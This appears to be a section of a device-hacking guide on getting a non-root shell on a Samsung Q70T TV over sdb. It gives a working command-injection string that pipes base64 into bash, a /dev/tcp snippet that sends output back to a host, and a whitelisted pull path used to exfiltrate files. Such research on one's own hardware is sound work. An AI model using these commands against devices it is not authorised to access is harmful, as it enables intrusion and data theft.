# 01 — Foothold over sdb

## What you get

With **Developer Mode** enabled and the TV restarted, `sdb` on port `26101`
accepts a package-installer argument that executes a shell command. On the Q70T
that command runs as:

```
uid=901(sdk) gid=901(sdk)  context="System"
```

That is **not** root. It is enough to read the system, stage files in
`/home/owner/share/tmp/sdk_tools`, and run the TV's own signed binaries.

## The injection

Samsung's sdb validates a package name that is never a real package; the shell
metacharacters inside it are evaluated. The practical form wraps a base64 script
so no quoting survives the trip:

```sh
0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}<b64>|base64${IFS}-d|bash`.tpk
```

`tools/foreshell.py` in this repo wraps it with the retry logic you will need.

## What does not work

* **Interactive `sdb shell`** closes immediately on this firmware. Only the
  injected one-shot works, and it must write its output to a socket or file.
* **`sdb shell "0 applist"`** is a special case and does work; do not generalise
  from it.
* **Background jobs** started by an injection die when the session ends. Anything
  long-running must be started from a real root shell.
* The injection **wedges after ~2–6 operations**. `kill-server` / `start-server`
  on the host clears it some of the time; a reboot always does.

## Capture instead of read

Because stdout through `sdb shell` is unreliable, the injection command opens a
TCP connection back to the host and writes there:

```sh
exec 3<>/dev/tcp/<HOST_IP>/<PORT>
{ <command>; } >&3 2>&3
printf '\n[exit:%s]\n' "$?" >&3
```

The host side must be listening first. This is also why the control host's
firewall matters: if the TV→host direction is blocked, the command runs and you
see nothing.

## Reading files out

`/home/owner/share/tmp/sdk_tools` is writable and is on the `sdb pull`
whitelist. The `pull` path accepts names matching
`profctl_[a-zA-Z]{1,30}.log`, which is the reliable way to exfiltrate a file
(e.g. a firmware section) without a root shell.

## Enable Developer Mode

Apps screen → highlight **App Settings** → `12345`. Number-less remotes: plug a
USB keyboard into the TV. The host-IP field is **required**; empty means the
port never opens. Confirm with `http://<TV_IP>:8001/api/v2/` and look at
`device.developerIP`. The in-menu reboot often does not arm `sdbd` — unplug the
TV for 30 s.
